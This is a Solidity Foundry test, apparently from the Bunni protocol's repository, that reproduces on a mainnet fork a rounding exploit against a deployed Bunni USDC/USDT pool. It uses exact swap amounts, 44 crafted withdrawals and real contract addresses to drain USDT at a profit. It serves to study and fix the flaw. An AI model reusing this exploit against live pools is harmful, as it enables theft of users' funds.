pragma solidity ^0.8.13;

import "forge-std/console2.sol";
import "./BaseTest.sol";
import "../src/ldf/CarpetedDoubleGeometricDistribution.sol";
import "../src/types/IdleBalance.sol";
import "../src/lib/QueryLDF.sol";
import "../src/lib/QueryTWAP.sol";
import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";
import {BunniHubLogic} from "../src/lib/BunniHubLogic.sol";

contract Exploit is BaseTest {
    using SafeTransferLib for address;

    address internal constant usdc = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant usdt = 0xdAC17F958D2ee523a2206206994597C13D831ec7;

    struct LiquidityInfo {
        uint256 totalLiquidity;
        uint256 activeBalance0;
        uint256 activeBalance1;
    }

    function _getLiquidityInfo(PoolKey memory key) internal returns (LiquidityInfo memory info) {
        PoolId id = key.toId();
        bytes32 ldfState = bunniHook.ldfStates(id);
        (uint256 balance0, uint256 balance1) = hub.poolBalances(id);
        (uint160 sqrtPriceX96, int24 tick,,) = bunniHook.slot0s(id);
        IdleBalance idleBalance = hub.idleBalance(id);
        PoolState memory state = hub.poolState(id);
        bytes32 ldfParams = state.ldfParams;
        ILiquidityDensityFunction ldf_ = state.liquidityDensityFunction;
        int24 twapTick = queryTwap(key, state.twapSecondsAgo);
        vm.prank(address(hub));
        (info.totalLiquidity,,,, info.activeBalance0, info.activeBalance1,,) = queryLDF({
            key: key,
            sqrtPriceX96: sqrtPriceX96,
            tick: tick,
            arithmeticMeanTick: twapTick,
            ldf: ldf_,
            ldfParams: ldfParams,
            ldfState: ldfState,
            balance0: balance0,
            balance1: balance1,
            idleBalance: idleBalance
        });
    }

    function setUp() public override {
        super.setUp();

        // use mainnet
        vm.createSelectFork("mainnet");
        vm.rollFork(bytes32(0x1c27c4d625429acfc0f97e466eda725fd09ebdc77550e529ba4cbdbc33beb97b));

        hub = IBunniHub(0x000000000049C7bcBCa294E63567b4D21EB765f1);
        bunniHook = BunniHook(payable(0x000052423c1dB6B7ff8641b85A7eEfc7B2791888));
        poolManager = IPoolManager(payable(0x000000000004444c5dc75cB358380D2e3dE08A90));
        quoter = BunniQuoter(0x00000000E15009D51C6d57f7164f4Ed4996ae55C);

        // deploy uniswapper
        swapper = new Uniswapper(poolManager);

        // approve tokens
        usdc.safeApprove(address(poolManager), type(uint256).max);
        usdt.safeApprove(address(poolManager), type(uint256).max);
        usdc.safeApprove(address(swapper), type(uint256).max);
        usdt.safeApprove(address(swapper), type(uint256).max);
        usdc.safeApprove(address(hub), type(uint256).max);
        usdt.safeApprove(address(hub), type(uint256).max);

        // overwrite contracts
        // dev: used for testing fixes locally
        // vm.etch(0x000000000dBB048F2E744E4b15B5AeEf65e09528, type(BunniHubLogic).runtimeCode);
    }

    function testExploit() external {
        PoolKey memory key = PoolKey({
            currency0: Currency.wrap(usdc),
            currency1: Currency.wrap(usdt),
            fee: 0,
            tickSpacing: 1,
            hooks: IHooks(address(bunniHook))
        });
        PoolId id = key.toId();
        IBunniToken bunniToken = hub.bunniTokenOfPool(id);

        // check totalLiquidity
        {
            LiquidityInfo memory info = _getLiquidityInfo(key);
            console2.log("Initial totalLiquidity:", info.totalLiquidity);
        }

        // step 1: swap oneForZero to large tick to get activeBalance0 to be a small value
        console2.log("--- Starting first swaps ---");
        deal(usdt, address(this), 3e12);
        {
            _swap(
                key,
                IPoolManager.SwapParams({
                    zeroForOne: false,
                    amountSpecified: -17088106,
                    sqrtPriceLimitX96: 79226236828369693485340663719
                }),
                0,
                ""
            );
            _swap(
                key,
                IPoolManager.SwapParams({
                    zeroForOne: false,
                    amountSpecified: 1835309634512,
                    sqrtPriceLimitX96: 1461446703485210103287273052203988822378723970341
                }),
                0,
                ""
            );
            _swap(
                key,
                IPoolManager.SwapParams({
                    zeroForOne: false,
                    amountSpecified: -1000000,
                    sqrtPriceLimitX96: 101729702841318637793976746270
                }),
                0,
                ""
            );
        }

        console2.log("--- First swaps done ---");

        // check activeBalance0
        {
            LiquidityInfo memory info = _getLiquidityInfo(key);
            assertLe(info.activeBalance0, 25);
            console2.log("Total liquidity:", info.totalLiquidity);
        }

        // step 2: repeated small withdrawals to get activeBalance0 smaller
        console2.log("--- Starting repeated small withdrawals ---");
        deal(address(bunniToken), address(this), type(uint128).max);
        uint256 amountFirst = 119254548996;
        uint256 amountSecond = 331262636100;
        hub.withdraw(
            IBunniHub.WithdrawParams({
                poolKey: key,
                recipient: address(this),
                shares: amountFirst,
                amount0Min: 0,
                amount1Min: 0,
                deadline: block.timestamp,
                useQueuedWithdrawal: false
            })
        );
        console2.log("totalLiquidity after withdrawal 0:", quoter.getTotalLiquidity(key));
        for (uint256 i; i < 43; i++) {
            hub.withdraw(
                IBunniHub.WithdrawParams({
                    poolKey: key,
                    recipient: address(this),
                    shares: amountSecond,
                    amount0Min: 0,
                    amount1Min: 0,
                    deadline: block.timestamp,
                    useQueuedWithdrawal: false
                })
            );
            console2.log("totalLiquidity after withdrawal %d: %d", i + 1, quoter.getTotalLiquidity(key));
        }
        console2.log("--- Repeated small withdrawals done ---");

        // check totalLiquidity
        uint256 totalLiquidityBefore;
        {
            LiquidityInfo memory info = _getLiquidityInfo(key);
            assertEq(info.activeBalance0, 3, "activeBalance0 should be 3");
            console2.log("Active balance became 3 after the small withdrawals");
            totalLiquidityBefore = info.totalLiquidity;
            console2.log("Total liquidity:", totalLiquidityBefore);
        }

        // step 3: swap oneForZero exactIn to get activeBalance0 to be 0
        console2.log("--- Starting final swaps ---");
        int256 swapAmountFirst = -10000000000000_000000;
        deal(usdt, address(this), uint256(-swapAmountFirst));
        console2.log("-- Final swaps: oneForZero exactIn --");
        _swap(
            key,
            IPoolManager.SwapParams({
                zeroForOne: false,
                amountSpecified: swapAmountFirst,
                sqrtPriceLimitX96: 1461446703485210103287273052203988822378723970341
            }),
            0,
            ""
        );
        console2.log("-- Done --");

        // check activeBalance0 and totalLiquidity
        uint256 totalLiquidityAfter;
        {
            LiquidityInfo memory info = _getLiquidityInfo(key);
            // assertEq(info.activeBalance0, 0, "activeBalance0 should be 0");
            console2.log("Active balance became 0 after the second-to-last swap");
            totalLiquidityAfter = info.totalLiquidity;
            console2.log("Total liquidity:", totalLiquidityAfter);
        }

        // totalLiquidity should have increased significantly
        assertGt(
            totalLiquidityAfter, totalLiquidityBefore * 11 / 10, "totalLiquidity should have increased significantly"
        );
        console2.log("totalLiquidity before:", totalLiquidityBefore);
        console2.log("totalLiquidity after:", totalLiquidityAfter);
        console2.log("totalLiquidity increased by:", totalLiquidityAfter - totalLiquidityBefore);

        // step 4: swap zeroForOne exactOut to extract value
        int256 swapAmountSecond = 10000002885864_344623;
        deal(usdc, address(this), 2898691_202249);
        console2.log("-- Final swaps: zeroForOne exactOut --");
        uint256 beforeUsdcBalance = IERC20(usdc).balanceOf(address(this));
        _swap(
            key,
            IPoolManager.SwapParams({zeroForOne: true, amountSpecified: swapAmountSecond, sqrtPriceLimitX96: 4295128740}),
            0,
            ""
        );
        console2.log("-- Done --");
        uint256 swapInAmount = beforeUsdcBalance - IERC20(usdc).balanceOf(address(this));

        // check activeBalance0
        {
            LiquidityInfo memory info = _getLiquidityInfo(key);
            assertGt(info.activeBalance0, 1e6, "activeBalance0 should be significant after the final swap");
        }

        // check USDT balance
        uint256 usdtExploited = IERC20(usdt).balanceOf(address(this)) - uint256(-swapAmountFirst);
        console2.log("Exploited USDT amount:", usdtExploited);
        assertGt(usdtExploited, 1e12);
        console2.log("Cost in USDC:", swapInAmount);
        console2.log("Is profitable:", usdtExploited > swapInAmount ? "true" : "false");
    }
}
